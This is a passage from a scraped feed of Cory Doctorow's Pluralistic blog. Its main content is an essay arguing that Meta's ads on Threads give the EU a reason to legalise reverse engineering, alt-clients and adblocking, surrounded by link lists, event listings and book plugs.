https://www.dnalounge.com/backstage/log/2026/02/01.html\\n</li>\\n<li>\\n<p>A Letter On Justice And Open Debate About Raping Children https://www.popehat.com/p/a-letter-on-justice-and-open-debate-about-raping-children</p>\\n</li>\\n<li>\\n<p>Impeach President Miller https://prospect.org/2026/01/31/impeach-president-miller/</p>\\n</li>\\n<li>\\n<p>Google Settlement May Bring New Privacy Controls for Real-Time Bidding https://www.eff.org/deeplinks/2026/01/google-settlement-may-bring-new-privacy-controls-real-time-bidding</p>\\n</li>\\n<li>\\n<p>U.S. government has lost more than 10,000 STEM Ph.D.s since Trump took office https://www.science.org/content/article/u-s-government-has-lost-more-10-000-stem-ph-d-s-trump-took-office</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>#25yrsago Acme License-Plate Maker https://www.acme.com/licensemaker/licensemaker.cgi?state=California&amp;amp;text=NSHITKN&amp;amp;plate=1987&amp;amp;r=943099606</p>\\n<p>#15yrsago Apple implements iStore changes, prohibits Sony from selling competing ebook app https://www.nytimes.com/2011/02/01/technology/01apple.html?_r=3</p>\\n<p>#15yrsago IPv4 is exhausted https://tech.slashdot.org/story/11/02/01/0036227/Last-Available-IPv4-Blocks-Allocated</p>\\n<p>#15yrsago Harper\u2019s publisher rejects $50K worth of pledges, will lay off staff anyway https://docs.google.com/forms/d/e/1FAIpQLSdDoZvxCvsax1zkMKANucBCQU8v-08tcw6VIDrtnmnqLY9I0A/viewform?formkey=dGdtbXUtNUV3cmtpaXJienJ5bldwcUE6MQ</p>\\n<p>#15yrsago South Dakota senator introduces mandatory gun-ownership law https://www.newser.com/story/111031/south-dakota-bill-every-adult-must-own-a-gun.html</p>\\n<p>#10yrsago UK Snooper\u2019s Charter is so broad, no one can figure out what it means https://web.archive.org/web/20160202092111/https://motherboard.vice.com/read/tech-firms-are-unclear-on-new-uk-surveillance-laws-warns-government-committee</p>\\n<p>#5yrsago The good news about vaccination bad news https://pluralistic.net/2021/02/01/dinos-and-rinos/#mixed-news</p>\\n<p>#5yrsago Unidirectional entryism https://pluralistic.net/2021/02/01/dinos-and-rinos/#entryism</p>\\n<p>#15yrsago Inside Sukey the anti-kettling mobile app https://www.theguardian.com/uk/2011/feb/02/inside-anti-kettling-hq</p>\\n<p>#10yrsago Swatting attempted against Congresswoman who introduced anti-swatting bill https://www.bostonglobe.com/metro/2016/02/01/cops-swarm-rep-katherine-clark-melrose-home-after-apparent-hoax/yqEpcpWmKtN6bOOAj8FZXJ/story.html</p>\\n<p>#10yrsago A would-be clinic-bomber &amp; friends are terrorizing a charter school for being too close to a future Planned Parenthood office https://web.archive.org/web/20160318235447/https://broadly.vice.com/en_us/article/inside-the-bizarre-war-anti-abortion-zealots-are-waging-against-school-kids</p>\\n<p>#10yrsago Ross and Carrie become Scientologists: an investigative report 5 years in the making https://ohnopodcast.com/investigations/2016/2/1/ross-and-carrie-audit-scientology-part-1-going-preclear</p>\\n<p>#10yrsago Exclusive: Snowden intelligence docs reveal UK spooks\u2019 malware checklist https://memex.craphound.com/2016/02/02/exclusive-snowden-intelligence-docs-reveal-uk-spooks-malware-checklist/</p>\\n<p>#5yrsago The free market and rent-seeking https://pluralistic.net/2021/02/02/euthanize-rentiers/#poor-doors</p>\\n<p>#5yrsago Criti-Hype https://pluralistic.net/2021/02/02/euthanize-rentiers/#dont-believe-the-hype</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Salt Lake City: Enshittification at the Utah Museum of Fine Arts (Tanner Humanities Center), Feb 18\\nhttps://tanner.utah.edu/center-events/cory-doctorow/\\n</li>\\n<li>\\n<p>Montreal (remote): Fedimtl, Feb 24\\nhttps://fedimtl.ca/</p>\\n</li>\\n<li>\\n<p>Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5\\nhttps://www.rebootcommunications.com/event/vipss2026/</p>\\n</li>\\n<li>\\n<p>Berkeley: Bioneers keynote, Mar 27\\nhttps://conference.bioneers.org/</p>\\n</li>\\n<li>\\n<p>Berlin: Re:publica, May 18-20\\nhttps://re-publica.com/de/news/rp26-sprecher-cory-doctorow</p>\\n</li>\\n<li>\\n<p>Berlin: Enshittification at Otherland Books, May 19\\nhttps://www.otherland-berlin.de/de/event-details/cory-doctorow.html</p>\\n</li>\\n<li>\\n<p>Hay-on-Wye: HowTheLightGetsIn, May 22-25\\nhttps://howthelightgetsin.org/festivals/hay/big-ideas-2</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>How the Internet Got Worse (Masters in Business)\\nhttps://www.youtube.com/watch?v=auXlkuVhxMo\\n</li>\\n<li>\\n<p>Enshittification (Jon Favreau/Offline):\\nhttps://crooked.com/podcast/the-enshittification-of-the-internet-with-cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Why Big Tech is a Trap for Independent Creators (Stripper News)\\nhttps://www.youtube.com/watch?v=nmYDyz8AMZ0</p>\\n</li>\\n<li>\\n<p>Enshittification (Creative Nonfiction podcast)\\nhttps://brendanomeara.com/episode-507-enshittification-author-cory-doctorow-believes-in-a-new-good-internet/</p>\\n</li>\\n<li>\\n<p>Enshittification with Plutopia\\nhttps://plutopia.io/cory-doctorow-enshittification/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Canny Valley\": A limited edition collection of the collages I create for Pluralistic, self-published, September 2025\\n</li>\\n<li>\\n<p>\"Enshittification: Why Everything Suddenly Got Worse and What to Do About It,\" Farrar, Straus, Giroux, October 7 2025\\nhttps://us.macmillan.com/books/9780374619329/enshittification/</p>\\n</li>\\n<li>\\n<p>\"Picks and Shovels\": a sequel to \"Red Team Blues,\" about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (https://us.macmillan.com/books/9781250865908/picksandshovels).</p>\\n</li>\\n<li>\\n<p>\"The Bezzle\": a sequel to \"Red Team Blues,\" about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org).</p>\\n</li>\\n<li>\\n<p>\"The Lost Cause:\" a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (http://lost-cause.org).</p>\\n</li>\\n<li>\\n<p>\"The Internet Con\": A nonfiction book about interoperability and Big Tech (Verso) September 2023 (http://seizethemeansofcomputation.org). Signed copies at Book Soup (https://www.booksoup.com/book/9781804291245).</p>\\n</li>\\n<li>\\n<p>\"Red Team Blues\": \"A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.\" Tor Books http://redteamblues.com.</p>\\n</li>\\n<li>\\n<p>\"Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin\", on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 https://chokepointcapitalism.com</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Unauthorized Bread\": a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026\\n</li>\\n<li>\\n<p>\"Enshittification, Why Everything Suddenly Got Worse and What to Do About It\" (the graphic novel), Firstsecond, 2026</p>\\n</li>\\n<li>\\n<p>\"The Memex Method,\" Farrar, Straus, Giroux, 2026</p>\\n</li>\\n<li>\\n<p>\"The Reverse-Centaur\\'s Guide to AI,\" a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>Today\\'s top sources:</p>\\n<p>Currently writing: \"The Post-American Internet,\" a sequel to \"Enshittification,\" about the better world the rest of us get to have now that Trump has torched America (1007 words today, 19588 total)</p>\\n<ul>\\n<li>\"The Reverse Centaur\\'s Guide to AI,\" a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE.\\n</li>\\n<li>\\n<p>\"The Post-American Internet,\" a short book about internet policy in the age of Trumpism. PLANNING.</p>\\n</li>\\n<li>\\n<p>A Little Brother short story about DIY insulin PLANNING</p>\\n</li>\\n</ul>\\n\\n<p></p>\\n<p>This work \u2013 excluding any serialized fiction \u2013 is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>\\n<p>https://creativecommons.org/licenses/by/4.0/</p>\\n<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>\\n\\n\\n<p>Blog (no ads, tracking, or data-collection):</p>\\n<p>Pluralistic.net</p>\\n<p>Newsletter (no ads, tracking, or data-collection):</p>\\n<p>https://pluralistic.net/plura-list</p>\\n<p>Mastodon (no ads, tracking, or data-collection):</p>\\n<p>https://mamot.fr/@pluralistic</p>\\n<p>Medium (no ads, paywalled):</p>\\n<p>https://doctorow.medium.com/</p>\\n<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://twitter.com/doctorow</p>\\n<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</p>\\n<p>\"When life gives you SARS, you make sarsaparilla\" -Joey \"Accordion Guy\" DeVilla</p>\\n<p>READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (\"BOGUS AGREEMENTS\") that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer.</p>\\n<p>ISSN: 3066-764X</p>'}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"pluralistic.net/Pluralistic-%20Threads%27%20margin%20is%20the%20Eurostack%27s%20opportunity%20%2830%20Jan%202026%29_20260130/","title":"Pluralistic: Threads' margin is the Eurostack's opportunity (30 Jan 2026)Today\\'s linksThreads\\' margin is the Eurostack\\'s opportunity (permalink)Hey look at this (permalink)Object permanence (permalink)Upcoming appearances (permalink)Recent appearances (permalink)Latest books (permalink)Upcoming books (permalink)Colophon (permalink)How to get Pluralistic:","text":"<p>\u6765\u6e90: pluralistic.net \u53d1\u5e03\u65f6\u95f4: Fri, 30 Jan 2026 14:15:22 +0000 \u94fe\u63a5: https://pluralistic.net/2026/01/30/zucksauce/</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://pluralistic.net/feed/', 'value': '<p>\\n</p>\\n\\n<ul>\\n<li>Threads\\' margin is the Eurostack\\'s opportunity: Move fast and break kings.\\n</li>\\n<li>Hey look at this: Delights to delectate.\\n</li>\\n<li>Object permanence: Frank Chu; MPAA x TSA; Flint truths; Pastel Q; Bernie meme.\\n</li>\\n<li>Upcoming appearances: Where to find me.\\n</li>\\n<li>Recent appearances: Where I\\'ve been.\\n</li>\\n<li>Latest books: You keep readin\\' em, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Upcoming books: Like I said, I\\'ll keep writin\\' \\'em.\\n</li>\\n<li>Colophon: All the rest.\\n</li>\\n</ul>\\n<p></p>\\n\\n<p>\\n</p>\\n\\n<p>OG App is the coolest app you\\'ve never heard of. Back in 2022, two teenagers unilaterally disenshittified Instagram by making an \"alt-client\" that restored all the parts of Insta that made it a success and blocked all the antifeatures that Meta crammed down users\\' throats after they had them locked in.</p>\\n<p>Here\\'s how OG App worked: first, it popped up a browser window and loaded the Instagram login screen. Then, after you\\'d logged into Insta, it stole the \"session key\" (the cryptographic proof that you were logged into your account). That let it impersonate you to Insta\\'s servers, and slurp down the whole feed that Insta had queued up for you.</p>\\n<p>After grabbing your feed, OG App deleted all the ads, all the slop, all the boosted content, all the months-old clickbait that The Algorithm (TM) had surfaced. What was left was pristine: the posts from people you followed, in reverse-chronological order. To make this all even sweeter, OG App sent no data back to Meta as you used it, except for the likes and comments you intended to transmit to the company. All the other data that Meta\\'s apps gather got blocked: everything from your location, to which posts you slowed down your scrolling on, to accelerometer readouts that revealed minute changes in how you hold your phone from second to second.</p>\\n<p>Boy did people like this! By the end of the day, OG App was in the top ten charts for both Google and Apple\\'s app stores. By the next morning, it was gone. Meta sent a takedown notice to the app store duopoly and they killed OG App on its behalf (there is honor among thieves):</p>\\n<p>https://techcrunch.com/2022/09/27/og-app-promises-you-an-ad-free-instagram-feed/</p>\\n<p>The funny thing is, the OG App creators were just following the Facebook playbook. When Facebook opened up to the general public in 2006, it had the problem that everyone who wanted social media already had an account on Myspace, and all of Facebook\\'s improvements on Myspace (Zuck made a promise never to spy on his users!) didn\\'t matter, because Myspace had something Facebook could not match: Myspace had all your friends.</p>\\n<p>Facebook came up with an ingenious solution to this problem: they offered Myspace users a bot. You gave that bot your Myspace login credentials (just as OG App did with your Insta credentials) and the bot impersonated you to Myspace (just as OG App did with Insta), and it grabbed everything queued up for you on Myspace (just as OG App did with Insta), and then flowed those messages into your Facebook feed (just as OG App did with Insta).</p>\\n<p>This was very successful! Users didn\\'t have to choose between their friends on Myspace and the superior design and privacy policies of Facebook. They got to eat their cake and have it, too.</p>\\n<p>This is actually a very old and important pattern in tech. It\\'s what \"move fast and break things\" looks like when it\\'s actually disrupting sclerotic and decaying companies that lock us in, take us for granted, and treat us like shit. It\\'s what Apple did when they cloned the MS Office file formats and released iWork, whose Pages, Numbers and Keynote let Microsoft users escape from the prison of Windows and bring their documents with them:</p>\\n<p>https://www.eff.org/deeplinks/2019/06/adversarial-interoperability-reviving-elegant-weapon-more-civilized-age-slay</p>\\n<p>But like every pirate, the tech companies dreamed of being admirals. Once they\\'d attained the admiralty, they announced that when they did this stuff, it was progress, but if anyone does it to them, it would be piracy.</p>\\n<p>What\\'s more, they were able to take advantage of a metastasizing blob of IP laws that the US Trade Representative spread around the world (with threats of tariffs for noncompliance). Soon, nearly every country had enacted laws that made it a literal crime for their entrepreneurs and technologists to fix America\\'s defective tech exports by adding privacy tools, bridging old services into new ones, or reading and writing America\\'s ubiquitous proprietary file-formats:</p>\\n<p>https://pluralistic.net/2026/01/01/39c3/#the-new-coalition</p>\\n<p>For decades, this system was immovable. The world couldn\\'t afford tariffs on its exports to the USA, and it was able to maintain the pretense that America\\'s platforms were trustworthy neutral parties, that would not be weaponized against their own national interest at the behest of the American state.</p>\\n<p>Obviously, that is dead now. Donald Trump, debilitated by white matter disease and his endemic incontinent belligerence, has flipped the table over in a poker game that was rigged in his favor because he resented having to pretend to play (TM November Kelly):</p>\\n<p>https://pluralistic.net/2026/01/26/i-dont-want/#your-greenback-dollar</p>\\n<p>EU member-states are minting new \"digital sovereignty\" ministries as fast as they can print up new business cards, the EU itself has just appointed its first \"Tech Sovereignty, Security and Democracy\" czar:</p>\\n<p>https://commission.europa.eu/about/organisation/college-commissioners/henna-virkkunen_en</p>\\n<p>They\\'re building the \"Eurostack,\" a fleet of EU-based data centers that will host free, open, auditable, trustworthy equivalents to the US tech giants\\' offerings:</p>\\n<p>https://pluralistic.net/2025/06/25/eurostack/#viktor-orbans-isp</p>\\n<p>But Eurostack is about to run into a wall: Article 6 of the EU\\'s own Copyright Directive, which prohibits reverse-engineering and modification of tech products. It\\'s a law that the US Trade Rep lobbied hard for, winning the day by promising tariff-free access to the US for Europe\\'s exports (a promise Trump has now broken):</p>\\n<p>https://pluralistic.net/2025/10/15/freedom-of-movement/#data-dieselgate</p>\\n<p>So long as Europe continues to hold up its end of this one-sided bargain, it will not be able to create the reverse-engineering based tools to let EU companies, governments and households get their data out of US tech silos, let alone let them build and enjoy successors to OG App, which will make it easy for them to leave US social media without sacrificing contact with the people who matter to them.</p>\\n<p>Which brings me to Threads, Meta\\'s latest social media network. Threads is built on Activitypub and Mastodon, these being open/free, auditable and trustworthy protocols, designed to support \"federated\" social media. That\\'s social media that runs on servers managed by lots of different entities, whose users can all connect to one another no matter which server they use. Meta was clearly excited by the prospect of enclosing and conquering this open upstart, but also nervous at the prospect that its users would find, in federation, an easy path to escape from Meta\\'s clutches.</p>\\n<p>After all, if you can leave Threads and join a non-Meta Mastodon server without losing contact with the people you followed and were followed by on Threads, then why wouldn\\'t you leave? Mark Zuckerberg\\'s users don\\'t like him \u2013 they just hate him less than they love the people they are in community with on Zuckerberg\\'s platforms.</p>\\n<p>So Threads never really joined the Fediverse. You can\\'t quite follow and be followed by Mastodon users, and you can\\'t quite migrate your account off Meta\\'s servers and onto a better one. Zuck and his lieutenants are keenly attuned to any design that drives high \"switching costs\" for leaving their services, and they exploit these switching costs to figure out just how much pain they can inflict on users without risking their departure:</p>\\n<p>https://www.eff.org/deeplinks/2021/08/facebooks-secret-war-switching-costs</p>\\n<p>So now they\\'ve started to turn the screws on Threads users. They just announced a global program of Threads enshittification, with a promise to cram ads into the eyeballs of every Threads account:</p>\\n<p>https://www.contentgrip.com/meta-threads-ads-go-global/</p>\\n<p>This represents a hell of an opportunity for the EU and Eurostack. Meta\\'s ads are wildly illegal in the EU, violating Europe\\'s landmark privacy law, the GDPR. The only reason Meta gets away with its flagrant lawbreaking is that it has captured the Irish state, and uses legal tricks to force all GDPR enforcement into Irish jurisdiction:</p>\\n<p>https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta</p>\\n<p>People hate ads. More than half of all web users have installed an adblocker (which also protects their privacy). It\\'s the largest consumer boycott in human history:</p>\\n<p>https://doc.searls.com/2023/11/11/how-is-the-worlds-biggest-boycott-doing/</p>\\n<p>But no one has ever installed an adblocker for an app, because reverse-engineering apps and the mobile platforms they run on is illegal under laws like Article 6 of the Copyright Directive. As a result, tech companies \u2013 especially US giants, who can violate EU law with impunity \u2013 love to enshittify their apps, because they know that no one can do unto them as they did unto their own rivals (like Myspace).</p>\\n<p>Meta\\'s new ad strategy for Threads is the perfect cue for a European repeal of Article 6 of the Copyright Directive. Procedurally, this is a great moment for it, as the EU is finalizing the Digital Fairness Act, which could include an exemption to EUCD 6 for privacy-enhancing technologies:</p>\\n<p>https://www.europarl.europa.eu/legislative-train/theme-protecting-our-democracy-upholding-our-values/file-digital-fairness-act</p>\\n<p>Giving Europeans an effective way to push back against Meta\\'s wholesale violation of their rights is a way that the Eurostack can score popular support right now \u2013 not in five years when the new data centers come online. It\\'s a way of improving the lives of Europeans in immediate, concrete ways, rather than asking them to be grateful that some ministry has changed cloud providers \u2013 an important change, sure, but one that has no real impact on their daily lives.</p>\\n<p>What\\'s more, legalizing jailbreaking for the purpose of making Threads alt-clients wouldn\\'t just give Europeans a better social media experience \u2013 it could bootstrap European social media services. Remember, Threads was able to achieve instant scale by moving Instagram users onto Threads wholesale, maintaining their Insta follows and followers when they created their Threads accounts.</p>\\n<p>Europe \u2013 like everywhere else \u2013 is full of entrepreneurs who are trying to get national, independent social media platforms off the ground, hoping to woo users by promising them a more privacy-respecting alternative. They\\'ve got the same problem Zuck had when he tried to compete with Myspace: users love their friends more than they hate being spied on, so merely offering a better service is insufficient.</p>\\n<p>To get users off the old platforms, you have to lower their switching costs \u2013 you have to let them bring their friends to the new network, even if those friends are still stuck on the old network. Legalize jailbreaking in the EU and you\\'ll make it possible to do \"on-device bridging\" \u2013 where a new social media app is able to break open the data storage of the Threads app on the same device and move that data into its own feeds. And because the EU has the GDPR, they have the privacy framework needed to police the privacy violations that breaking into other apps\\' data storage can lead to.</p>\\n<p>Meta will squawk. They\\'ll say Europe is legalizing the violation of its corporate rights. But Meta violates Europeans\\' rights at scale, and the \"rights\" that I\\'m talking about taking away from Meta are rights the EU gave it in the first place, in exchange for a broken promise of tariff-free access to the USA.</p>\\n<p>Adblocking isn\\'t stealing. Adblocking is bargaining. Without adblocking, the companies don\\'t sell us services in exchange for our privacy \u2013 they plunder all the private data they can get, and dribble out services at whatever level they think we deserve. If ad-supported media was a restaurant, it\\'d be one where you got thrown up against a wall, relieved of your wallet, fed a handful of gruel, and then got kicked in the ass and sent on your way:</p>\\n<p>https://www.eff.org/deeplinks/2019/07/adblocking-how-about-nah</p>\\n<p>Every time Donald Trump threatens the EU, he makes the case for the Eurostack, but still, he can\\'t help himself. Likewise, every time Zuckerberg enshittifies his services, he makes the case for repealing Article 6 of the Copyright Directive, and he can\\'t help himself either.</p>\\n<p>Threads\\' inexorable enshittification is an opportunity: an opportunity to make the case for the Eurostack, an opportunity to improve the lives of millions of Europeans, and an opportunity to break through the walled gardens that keep the people we love stuck on legacy social media platforms.</p>\\n<p>When they did it to us, that wasn\\'t progress. When we do it to them, it\\'s not piracy.</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>EFF to Close Friday in Solidarity with National Shutdown  https://www.eff.org/deeplinks/2026/01/eff-close-friday-solidarity-national-shutdown\\n</li>\\n<li>\\n<p>Let\\'s Make Hope Normal Again https://www.youtube.com/watch?v=qxt4HCjd7VA</p>\\n</li>\\n<li>\\n<p>Detecting Dementia Using Lexical Analysis: Terry Pratchett\u2019s Discworld Tells a More Personal Story  https://www.mdpi.com/2076-3425/16/1/94</p>\\n</li>\\n<li>\\n<p>How is Inventing the Renaissance an SFF-Related Work? https://www.exurbe.com/how-is-inventing-the-renaissance-an-sff-related-work/</p>\\n</li>\\n<li>\\n<p>The Good, the Pretty, and Fear Itself https://catvalente.substack.com/p/the-good-the-pretty-and-fear-itself</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>#25yrsago Frank Chu explainer http://www.12galaxies.20m.com</p>\\n<p>#20yrsago Kerouac curator invents copyright laws to keep photographers away https://thomashawk.com/2006/01/open-letter-to-myra-borshoff-cook-tour.html</p>\\n<p>#20yrsago EFF suing AT&amp;T for helping NSA illegally spy on Americans https://www.eff.org/cases/nsa-multi-district-litigation</p>\\n<p>#20yrsago CD DRM software players are amateurish and easy to trick https://blog.citp.princeton.edu/2006/01/31/cd-drm-attacks-player/</p>\\n<p>#20yrsago MPAA puts TSA goon in charge of enforcement https://web.archive.org/web/20060209035921/http://www.mpaa.org/press_releases/2006_01_31.pdf</p>\\n<p>#20yrsago US-VISIT immigration system spent $15 million per crook caught https://www.schneier.com/blog/archives/2006/01/the_failure_of_1.html</p>\\n<p>#20yrsago Law firm fires clerk for personal opposition to DRM https://web.archive.org/web/20060203030500/http://www.freeculturenyu.org/2006/01/31/drm-fired/</p>\\n<p>#15yrsago Free excerpt from Jo Walton\u2019s brilliant Among Others https://web.archive.org/web/20110204214337/http://www.tor.com/stories/2011/01/excerpt-among-others</p>\\n<p>#15yrsago Debunking yet another bought-and-paid-for report on the need for non-neutral net https://arstechnica.com/tech-policy/2011/01/huge-isps-want-per-gb-payments-from-netflix-youtube/</p>\\n<p>#15yrsago Batman: billionaire plutocrat vigilante https://reactormag.com/batman-plutocrat/</p>\\n<p>#15yrsago Another copyright troll throws in the towel https://www.eff.org/press/archives/2011/01/31</p>\\n<p>#10yrsago Ten hard truths about the Flint water atrocity https://www.ecowatch.com/michael-moore-10-things-they-wont-tell-you-about-the-flint-water-trage-1882162388.html</p>\\n<p>#10yrsago Watch: AMAZING slam poem about policing women\u2019s speech habits https://www.youtube.com/watch?v=me4_QwmaNoQ</p>\\n<p>#10yrsago Congress wants to know if agencies were compromised by the backdoor in Juniper gear (and where it came from) https://www.reuters.com/article/us-juniper-networks-congress-idUSKCN0V708P/</p>\\n<p>#5yrsago Know Nothings, conspiratorialism and Pastel Q https://pluralistic.net/2021/01/31/rhymes-with-pastel-q/#paranoid-style</p>\\n<p>#5yrsago Mashing the Bernie meme https://pluralistic.net/2021/01/31/rhymes-with-pastel-q/#bernie-3d</p>\\n\\n<p></p>\\n\\n<p></p>\\n<ul>\\n<li>Salt Lake City: Enshittification at the Utah Museum of Fine Arts (Tanner Humanities Center), Feb 18\\nhttps://tanner.utah.edu/center-events/cory-doctorow/\\n</li>\\n<li>\\n<p>Victoria: 28th Annual Victoria International Privacy &amp; Security Summit, Mar 3-5\\nhttps://www.rebootcommunications.com/event/vipss2026/</p>\\n</li>\\n<li>\\n<p>Berkeley: Bioneers keynote, Mar 27\\nhttps://conference.bioneers.org/</p>\\n</li>\\n<li>\\n<p>Berlin: Re:publica, May 18-20\\nhttps://re-publica.com/de/news/rp26-sprecher-cory-doctorow</p>\\n</li>\\n<li>\\n<p>Berlin: Enshittification at Otherland Books, May 19\\nhttps://www.otherland-berlin.de/de/event-details/cory-doctorow.html</p>\\n</li>\\n<li>\\n<p>Hay-on-Wye: HowTheLightGetsIn, May 22-25\\nhttps://howthelightgetsin.org/festivals/hay/big-ideas-2</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>How the Internet Got Worse (Masters in Business)\\nhttps://www.youtube.com/watch?v=auXlkuVhxMo\\n</li>\\n<li>\\n<p>Enshittification (Jon Favreau/Offline):\\nhttps://crooked.com/podcast/the-enshittification-of-the-internet-with-cory-doctorow/</p>\\n</li>\\n<li>\\n<p>Why Big Tech is a Trap for Independent Creators (Stripper News)\\nhttps://www.youtube.com/watch?v=nmYDyz8AMZ0</p>\\n</li>\\n<li>\\n<p>Enshittification (Creative Nonfiction podcast)\\nhttps://brendanomeara.com/episode-507-enshittification-author-cory-doctorow-believes-in-a-new-good-internet/</p>\\n</li>\\n<li>\\n<p>Enshittification with Plutopia\\nhttps://plutopia.io/cory-doctorow-enshittification/</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Canny Valley\": A limited edition collection of the collages I create for Pluralistic, self-published, September 2025\\n</li>\\n<li>\\n<p>\"Enshittification: Why Everything Suddenly Got Worse and What to Do About It,\" Farrar, Straus, Giroux, October 7 2025\\nhttps://us.macmillan.com/books/9780374619329/enshittification/</p>\\n</li>\\n<li>\\n<p>\"Picks and Shovels\": a sequel to \"Red Team Blues,\" about the heroic era of the PC, Tor Books (US), Head of Zeus (UK), February 2025 (https://us.macmillan.com/books/9781250865908/picksandshovels).</p>\\n</li>\\n<li>\\n<p>\"The Bezzle\": a sequel to \"Red Team Blues,\" about prison-tech and other grifts, Tor Books (US), Head of Zeus (UK), February 2024 (thebezzle.org).</p>\\n</li>\\n<li>\\n<p>\"The Lost Cause:\" a solarpunk novel of hope in the climate emergency, Tor Books (US), Head of Zeus (UK), November 2023 (http://lost-cause.org).</p>\\n</li>\\n<li>\\n<p>\"The Internet Con\": A nonfiction book about interoperability and Big Tech (Verso) September 2023 (http://seizethemeansofcomputation.org). Signed copies at Book Soup (https://www.booksoup.com/book/9781804291245).</p>\\n</li>\\n<li>\\n<p>\"Red Team Blues\": \"A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.\" Tor Books http://redteamblues.com.</p>\\n</li>\\n<li>\\n<p>\"Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin\", on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 https://chokepointcapitalism.com</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<ul>\\n<li>\"Unauthorized Bread\": a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026\\n</li>\\n<li>\\n<p>\"Enshittification, Why Everything Suddenly Got Worse and What to Do About It\" (the graphic novel), Firstsecond, 2026</p>\\n</li>\\n<li>\\n<p>\"The Memex Method,\" Farrar, Straus, Giroux, 2026</p>\\n</li>\\n<li>\\n<p>\"The Reverse-Centaur\\'s Guide to AI,\" a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026</p>\\n</li>\\n</ul>\\n\\n<p>\\n</p>\\n\\n<p>Today\\'s top sources:</p>\\n<p>Currently writing: \"The Post-American Internet,\" a sequel to \"Enshittification,\" about the better world the rest of us get to have now that Trump has torched America (1048 words today, 18579 total)</p>\\n<ul>\\n<li>\"The Reverse Centaur\\'s Guide to AI,\" a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE.\\n</li>\\n<li>\\n<p>\"The Post-American Internet,\" a short book about internet policy in the age of Trumpism. PLANNING.</p>\\n</li>\\n<li>\\n<p>A Little Brother short story about DIY insulin PLANNING</p>\\n</li>\\n</ul>\\n\\n<p></p>\\n<p>This work \u2013 excluding any serialized fiction \u2013 is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net.</p>\\n<p>https://creativecommons.org/licenses/by/4.0/</p>\\n<p>Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution.</p>\\n\\n\\n<p>Blog (no ads, tracking, or data-collection):</p>\\n<p>Pluralistic.net</p>\\n<p>Newsletter (no ads, tracking, or data-collection):</p>\\n<p>https://pluralistic.net/plura-list</p>\\n<p>Mastodon (no ads, tracking, or data-collection):</p>\\n<p>https://mamot.fr/@pluralistic</p>\\n<p>Medium (no ads, paywalled):</p>\\n<p>https://doctorow.medium.com/</p>\\n<p>Twitter (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://twitter.com/doctorow</p>\\n<p>Tumblr (mass-scale, unrestricted, third-party surveillance and advertising):</p>\\n<p>https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</p>\\n<p>\"When life gives you SARS, you make sarsaparilla\" -Joey \"Accordion Guy\" DeVilla</p>\\n<p>READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (\"BOGUS AGREEMENTS\") that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer.</p>\\n<p>ISSN: 3066-764X</p>'}</p> 